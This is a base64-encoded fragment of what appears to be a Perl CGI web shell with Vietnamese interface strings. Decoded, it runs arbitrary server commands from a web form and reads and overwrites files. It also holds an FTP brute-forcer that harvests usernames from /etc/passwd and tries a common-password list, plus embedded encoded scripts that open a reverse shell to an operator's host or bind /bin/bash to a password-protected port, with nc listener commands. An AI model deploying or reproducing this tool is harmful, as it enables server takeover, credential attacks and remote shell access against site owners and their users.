HQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgcnVuIGNvbW1hbmQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0Kc3ViIFJ1bkNtZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJfQ0KCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgl7DQoJCSR8PTE7DQoJCSRDb21tYW5kIC49ICIgfCI7DQoJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCXsNCgkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOw0KCQl9DQoJCSR8PTA7DQoJfQ0KCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCXsNCgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsNCgl9DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgRm9ybSBTYXZlIEZpbGUgDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGVGb3JtDQp7DQoJbXkgJHJlc3VsdCA9IiI7DQoJc3Vic3RyKCRSdW5Db21tYW5kLDAsNSk9IiI7DQoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOw0KCSRzYXZlPSc8YnI+PGlucHV0IG5hbWU9ImEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9InNhdmUiIGNsYXNzPSJzdWJtaXQiID4nOw0KCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRSdW5Db21tYW5kOw0KCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOw0KCWlmKC13ICRGaWxlKQ0KCXsNCgkJJHJvd3M9IjIzIg0KCX1lbHNlDQoJew0KCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7DQoJCSRyb3dzPSIyMCINCgl9DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCSRyZWFkPSgkV2luTlQpPyJ0eXBlIjoibGVzcyI7DQoJJFJ1bkNvbW1hbmQgPSAiJHJlYWQgXCIkUnVuQ29tbWFuZFwiIjsNCgkkcmVzdWx0IC49ICA8PEVORDsNCgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQoJJFByb21wdA0KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyI+DQoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCgk8YnI+Q29tbWFuZDogPHJ1bj4gJFJ1bkNvbW1hbmQgPC9ydW4+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IiRmaWxlIiA+ICRzYXZlIDxicj4gJG1zZw0KCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPg0KRU5EDQoJDQoJJHJlc3VsdCAuPSAmUnVuQ21kOw0KCSRyZXN1bHQgLj0gICI8L3RleHRhcmVhPiI7DQoJJHJlc3VsdCAuPSAgIjwvZm9ybT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KIyBTYXZlIEZpbGUNCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCnN1YiBTYXZlRmlsZSgkKQ0Kew0KCW15ICREYXRhPSBzaGlmdCA7DQoJbXkgJEZpbGU9IHNoaWZ0Ow0KCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOw0KCWlmKG9wZW4oRklMRSwgIj4kRmlsZSIpKQ0KCXsNCgkJYmlubW9kZSBGSUxFOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlyZXR1cm4gMTsNCgl9ZWxzZQ0KCXsNCgkJcmV0dXJuIDA7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCcnV0ZSBGb3JjZXIgRm9ybQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJydXRlRm9yY2VyRm9ybQ0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJHJlc3VsdCAuPSA8PEVORDsNCg0KPHRhYmxlPg0KDQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+DQpTaW1wbGUgRlRQIGJydXRlIGZvcmNlcjxicj4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJicnV0ZWZvcmNlciIvPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+DQpFTkQNCmNob3AoJHJlc3VsdCAuPSBgbGVzcyAvZXRjL3Bhc3N3ZCB8IGN1dCAtZDogLWYxYCk7DQokcmVzdWx0IC49IDw8J0VORCc7DQo8L3RleHRhcmVhPjwvdGQ+DQo8dGQ+DQoNClBhc3M6PGJyPg0KPHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0icGFzcyI+MTIzcGFzcw0KMTIzIUAjDQoxMjNhZG1pbg0KMTIzYWJjDQoxMjM0NTZhZG1pbg0KMTIzNDU1NDMyMQ0KMTIzNDQzMjENCnBhc3MxMjMNCmFkbWluDQphZG1pbmNwDQphZG1pbmlzdHJhdG9yDQptYXRraGF1DQpwYXNzYWRtaW4NCnBAc3N3b3JkDQpwQHNzdzByZA0KcGFzc3dvcmQNCjEyMzQ1Ng0KMTIzNDU2Nw0KMTIzNDU2NzgNCjEyMzQ1Njc4OQ0KMTIzNDU2Nzg5MA0KMTExMTExDQowMDAwMDANCjIyMjIyMg0KMzMzMzMzDQo0NDQ0NDQNCjU1NTU1NQ0KNjY2NjY2DQo3Nzc3NzcNCjg4ODg4OA0KOTk5OTk5DQoxMjMxMjMNCjIzNDIzNA0KMzQ1MzQ1DQo0NTY0NTYNCjU2NzU2Nw0KNjc4Njc4DQo3ODk3ODkNCjEyMzMyMQ0KNDU2NjU0DQo2NTQzMjENCjc2NTQzMjENCjg3NjU0MzIxDQo5ODc2NTQzMjENCjA5ODc2NTQzMjENCmFkbWluMTIzDQphZG1pbjEyMzQ1Ng0KYWJjZGVmDQphYmNhYmMNCiFAIyFAIw0KIUAjJCVeDQohQCMkJV4mKigNCiFAIyQkI0AhDQphYmMxMjMNCmFuaHlldWVtDQppbG92ZXlvdTwvdGV4dGFyZWE+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4NClNsZWVwOjxzZWxlY3QgbmFtZT0ic2xlZXAiPg0KDQo8b3B0aW9uPjA8L29wdGlvbj4NCjxvcHRpb24+MTwvb3B0aW9uPg0KPG9wdGlvbj4yPC9vcHRpb24+DQoNCjxvcHRpb24+Mzwvb3B0aW9uPg0KPC9zZWxlY3Q+IA0KPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1Ym1pdCIgdmFsdWU9IkJydXRlIEZvcmNlciIvPjwvdGQ+PC90cj4NCjwvZm9ybT4NCjwvdGFibGU+DQpFTkQNCnJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCcnV0ZSBGb3JjZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlcg0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJFNlcnZlcj0kRU5WeydTRVJWRVJfQUREUid9Ow0KCWlmKCRpbnsndXNlcid9IGVxICIiKQ0KCXsNCgkJJHJlc3VsdCAuPSAmQnJ1dGVGb3JjZXJGb3JtOw0KCX1lbHNlDQoJew0KCQl1c2UgTmV0OjpGVFA7IA0KCQlAdXNlcj0gc3BsaXQoL1xuLywgJGlueyd1c2VyJ30pOw0KCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOw0KCQljaG9tcChAdXNlcik7DQoJCWNob21wKEBwYXNzKTsNCgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7DQoJCWZvcmVhY2ggJHVzZXJuYW1lIChAdXNlcikNCgkJew0KCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQ0KCQkJew0KCQkJCWZvcmVhY2ggJHBhc3N3b3JkIChAcGFzcykNCgkJCQl7DQoJCQkJCSRmdHAgPSBOZXQ6OkZUUC0+bmV3KCRTZXJ2ZXIpIG9yIGRpZSAiQ291bGQgbm90IGNvbm5lY3QgdG8gJFNlcnZlck5hbWVcbiI7IA0KCQkJCQlpZigkZnRwLT5sb2dpbigiJHVzZXJuYW1lIiwiJHBhc3N3b3JkIikpDQoJCQkJCXsNCgkJCQkJCSRyZXN1bHQgLj0gIjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyJz5bK10gZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcjwvYT48YnI+XG4iOw0KCQkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCQkJYnJlYWs7DQoJCQkJCX0NCgkJCQkJaWYoISgkaW57J3NsZWVwJ30gZXEgIjAiKSkNCgkJCQkJew0KCQkJCQkJc2xlZXAoaW50KCRpbnsnc2xlZXAnfSkpOw0KCQkJCQl9DQoJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJJHJlc3VsdCAuPSAiXG48YnI+PT09PT09PT09PT4+Pj4+Pj4+Pj4gRmluaXNoZWQgPDw8PDw8PDw8PD09PT09PT09PT08YnI+XG4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQmFja2Nvbm5lY3QgRm9ybQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJhY2tCaW5kRm9ybQ0Kew0KCXJldHVybiA8PEVORDsNCgk8YnI+PGJyPg0KDQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmFja0Nvbm5lY3Q6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCgk8dGQ+IEhvc3Q6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIyMCIgbmFtZT0iY2xpZW50YWRkciIgdmFsdWU9IiRFTlZ7J1JFTU9URV9BRERSJ30iPg0KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+DQoNCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQ29ubmVjdCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shDQoJPGJyPlsrXSBUcnkgY2hlY2sgeW91ciBQb3J0IHdpdGggPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLyI+aHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvPC9hPg0KCTxicj5bK10gQ2xpZW50IGxpc3RlbiB3aXRoIGNvbW1hbmQ6IDxydW4+bmMgLXZ2IC1sIC1wIDxzcGFuIGlkPSJiYSI+ODA8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+DQoNCgk8YnI+PGJyPg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJpbmQgUG9ydDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KDQoJPHRkPiBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSIxNDEyIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmknKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPg0KDQoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENodWMgbmFuZyBjaHVhIGRjIHRlc3QhDQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT48YnI+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQmFja2Nvbm5lY3QgdXNlIHBlcmwNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZA0Kew0KCXVzZSBNSU1FOjpCYXNlNjQ7DQoJdXNlIFNvY2tldDsJDQoJJGJhY2twZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnU1U4Nk9sTnZZMnRsZERzTkNpUlRhR1ZzYkFrOUlDSXZZbWx1TDJKaGMyZ2lPdzBLSkVGU1IwTTlRRUZTUjFZN0RRcDFjMlVnVTI5amEyVjBPdzBLZFhObElFWnBiR1ZJWVc1a2JHVTdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnWjJWMGNISnZkRzlpZVc1aGJXVW9JblJqY0NJcEtTQnZjaUJrYVdVZ2NISnBiblFnSWxzdFhTQlZibUZpYkdVZ2RHOGdVbVZ6YjJ4MlpTQkliM04wWEc0aU93MEtZMjl1Ym1WamRDaFRUME5MUlZRc0lITnZZMnRoWkdSeVgybHVLQ1JCVWtkV1d6RmRMQ0JwYm1WMFgyRjBiMjRvSkVGU1IxWmJNRjBwS1NrZ2IzSWdaR2xsSUhCeWFXNTBJQ0piTFYwZ1ZXNWhZbXhsSUhSdklFTnZibTVsWTNRZ1NHOXpkRnh1SWpzTkNuQnlhVzUwSUNKRGIyNXVaV04wWldRaElqc05DbE5QUTB0RlZDMCtZWFYwYjJac2RYTm9LQ2s3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDSStKbE5QUTB0RlZDSXBPdzBLYjNCbGJpaFRWRVJGVWxJc0lqNG1VMDlEUzBWVUlpazdEUXB3Y21sdWRDQWlMUzA5UFNCRGIyNXVaV04wWldRZ1FtRmphMlJ2YjNJZ1BUMHRMU0FnWEc1Y2JpSTdEUXB6ZVhOMFpXMG9JblZ1YzJWMElFaEpVMVJHU1V4Rk95QjFibk5sZENCVFFWWkZTRWxUVkNBN1pXTm9ieUFuV3l0ZElGTjVjM1JsYldsdVptODZJQ2M3SUhWdVlXMWxJQzFoTzJWamFHODdaV05vYnlBbld5dGRJRlZ6WlhKcGJtWnZPaUFuT3lCcFpEdGxZMmh2TzJWamFHOGdKMXNyWFNCRWFYSmxZM1J2Y25rNklDYzdJSEIzWkR0bFkyaHZPeUJsWTJodklDZGJLMTBnVTJobGJHdzZJQ2M3SkZOb1pXeHNJaWs3RFFwamJHOXpaU0JUVDBOTFJWUTciOw0KCSRiaW5kcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1UyOWphMlYwT3cwS0pFRlNSME05UUVGU1IxWTdEUW9rY0c5eWRBazlJQ1JCVWtkV1d6QmRPdzBLSkhCeWIzUnZDVDBnWjJWMGNISnZkRzlpZVc1aGJXVW9KM1JqY0NjcE93MEtKRk5vWld4c0NUMGdJaTlpYVc0dlltRnphQ0k3RFFwemIyTnJaWFFvVTBWU1ZrVlNMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z0pIQnliM1J2S1c5eUlHUnBaU0FpYzI5amEyVjBPaVFoSWpzTkNuTmxkSE52WTJ0dmNIUW9VMFZTVmtWU0xDQlRUMHhmVTA5RFMwVlVMQ0JUVDE5U1JWVlRSVUZFUkZJc0lIQmhZMnNvSW13aUxDQXhLU2x2Y2lCa2FXVWdJbk5sZEhOdlkydHZjSFE2SUNRaElqc05DbUpwYm1Rb1UwVlNWa1ZTTENCemIyTnJZV1JrY2w5cGJpZ2tjRzl5ZEN3Z1NVNUJSRVJTWDBGT1dTa3BiM0lnWkdsbElDSmlhVzVrT2lBa0lTSTdEUXBzYVhOMFpXNG9VMFZTVmtWU0xDQlRUMDFCV0VOUFRrNHBDUWx2Y2lCa2FXVWdJbXhwYzNSbGJqb2dKQ0VpT3cwS1ptOXlLRHNnSkhCaFpHUnlJRDBnWVdOalpYQjBLRU5NU1VWT1ZDd2dVMFZTVmtWU0tUc2dZMnh2YzJVZ1EweEpSVTVVS1EwS2V3MEtDVzl3Wlc0b1UxUkVTVTRzSUNJK0prTk1TVVZPVkNJcE93MEtDVzl3Wlc0b1UxUkVUMVZVTENBaVBpWkRURWxGVGxRaUtUc05DZ2x2Y0dWdUtGTlVSRVZTVWl3Z0lqNG1RMHhKUlU1VUlpazdEUW9KYzNsemRHVnRLQ0oxYm5ObGRDQklTVk5VUmtsTVJUc2dkVzV6WlhRZ1UwRldSVWhKVTFRZ08yVmphRzhnSjFzclhTQlRlWE4wWlcxcGJtWnZPaUFuT3lCMWJtRnRaU0F0WVR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JWYzJWeWFXNW1iem9nSnpzZ2FXUTdaV05vYnp0bFkyaHZJQ2RiSzEwZ1JHbHlaV04wYjNKNU9pQW5PeUJ3ZDJRN1pXTm9ienNnWldOb2J5QW5XeXRkSUZOb1pXeHNPaUFuT3lSVGFHVnNiQ0lwT3cwS0NXTnNiM05sS0ZOVVJFbE9LVHNOQ2dsamJHOXpaU2hUVkVSUFZWUXBPdzBLQ1dOc2IzTmxLRk5VUkVWU1VpazdEUXA5RFFvPSI7DQoNCgkkQ2xpZW50QWRkciA9ICRpbnsnY2xpZW50YWRkcid9Ow0KCSRDbGllbnRQb3J0ID0gaW50KCRpbnsnY2xpZW50cG9ydCd9KTsNCglpZigkQ2xpZW50UG9ydCBlcSAwKQ0KCXsNCgkJcmV0dXJuICZCYWNrQmluZEZvcm07DQoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJhY2twZXJsKTsNCgkJaWYoLXcgIi90bXAvIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmFja2Nvbm5lY3QucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJhY2tjb25uZWN0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsIGJhY2tjb25uZWN0LnBsICRDbGllbnRBZGRyICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9ZWxzZQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOw0KCQlpZigtdyAiL3RtcCIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiaW5kcG9ydC5wbCAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAgQXJyYXkgTGlzdCBEaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSbURpcigkKSANCnsNCglteSAkZGlyID0gc2hpZnQ7DQogICAgaWYob3BlbmRpcihESVIsJGRpcikpDQoJew0KCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJew0KCQkJaWYoKCRmaWxlIG5lICIuIikgJiYgKCRmaWxlIG5lICIuLiIpKQ0KCQkJew0KCQkJCSRmaWxlPSAkZGlyLiRQYXRoU2VwLiRmaWxlOw0KCQkJCWlmKC1kICRmaWxlKQ0KCQkJCXsNCgkJCQkJJlJtRGlyKCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJdW5saW5rKCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCX0NCgkJY2xvc2VkaXIoRElSKTsNCgl9DQoJaWYoIXJtZGlyKCRkaXIpKQ0KCXsNCgkJDQoJfQ0KfQ0Kc3ViIEZpbGVPd25lcigkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlyZXR1cm4gIj8/PyI7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQkkbmFtZT1nZXRwd3VpZCgkdWlkKTsNCgkJCSRncm91cD1nZXRncmdpZCgkZ2lkKTsNCgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOw0KCQl9DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBQYXJlbnRGb2xkZXIoJCkNCnsNCglteSAkcGF0aCA9IHNoaWZ0Ow0KCW15ICRDb21tID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgLi4iLiRDbWRTZXAuJENtZFB3ZDsNCgljaG9wKCRwYXRoID0gYCRDb21tYCk7DQoJcmV0dXJuICRwYXRoOw0KfQ0Kc3ViIEZpbGVQZXJtcygkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJbXkgJHVyID0gIi0iOw0KCW15ICR1dyA9ICItIjsNCglpZigtZSAkZmlsZSkNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0NCgkJCWlmKC13ICRmaWxlKXsgJHV3ID0gInciOyB9DQoJCQlyZXR1cm4gJHVyIC4gIiAvICIgLiAkdXc7DQoJCX1lbHNlDQoJCXsNCgkJCSRtb2RlPShzdGF0KCRmaWxlKSlbMl07DQoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOw0KCQkJcmV0dXJuICRyZXN1bHQ7DQoJCX0NCgl9DQoJcmV0dXJuICIwMDAwIjsNCn0NCnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkbGEpID0gKHN0YXQoJGZpbGUpKVs5XTsNCgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsNCgkJJHkgPSAkeSArIDE5MDA7DQoJCUBtb250aCA9IHF3LzEgMiAzIDQgNSA2IDcgOCA5IDEwIDExIDEyLzsNCgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7DQoJCXJldHVybiAkbG10aW1lOw0KCX0NCglyZXR1cm4gIj8/PyI7